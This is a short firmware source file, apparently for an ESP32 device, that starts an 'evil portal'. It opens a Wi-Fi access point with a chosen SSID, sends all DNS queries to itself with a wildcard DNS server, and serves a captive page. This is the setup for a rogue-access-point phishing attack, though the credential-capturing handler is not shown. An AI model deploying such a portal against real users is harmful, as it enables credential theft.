#include "evilPortal.h"
#include "ui.h"
#include "handler.h"  

IPAddress local_IP(192, 168, 69, 1);
IPAddress gateway(192, 168, 69, 1);
IPAddress subnet(255, 255, 255, 0);

DNSServer dnsServer;
AsyncWebServer server(80);

void startPortal(String ssid)
{
  // Start the AP
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(ssid);
  IPAddress myIP = WiFi.softAPIP();
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();

  // Start the DNS server
  if(dnsServer.start(53, "*", WiFi.softAPIP())){
    drawInfoBox("Success", "Dns server", "started", true, false);
    delay(100);
  }

  Serial.println("Ready!");
  Serial.print("IP address: ");
  Serial.println(WiFi.softAPIP());
}

void updatePortal()
{ 
  dnsServer.processNextRequest();
}